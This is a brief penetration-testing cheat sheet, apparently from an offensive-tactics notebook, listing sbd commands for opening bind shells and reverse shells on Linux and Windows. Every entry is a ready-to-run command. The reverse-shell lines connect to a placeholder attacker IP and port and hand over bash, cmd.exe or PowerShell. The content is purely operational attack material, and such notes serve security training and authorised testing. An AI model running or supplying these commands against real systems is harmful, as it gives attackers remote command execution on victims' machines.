# SBD

## 01 - Linux

### 1.1 - Bind Shell

```
$ sbd -lvnp <target_PORT> -e /bin/bash
```

### 1.2 - Reverse Shell

```
$ sbd <attacker_IP> <attacker_PORT> -e /bin/bash
```

## 02 - Windows

### 2.1 - Bind Shell

```
C:\> sbd -lvnp <target_PORT> -e cmd.exe

C:\> sbd -lvnp <target_PORT> -e powershell.exe
```

### 2.2 - Reverse Shell

```
C:\> sbd <attacker_IP> <attacker_PORT> -e cmd.exe

C:\> sbd <attacker_IP> <attacker_PORT> -e powershell.exe
```

---
## References

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xB - Callback Shells/Shell Handler/Cross Platform/Manual/SBD|Shell Handler: SBD]]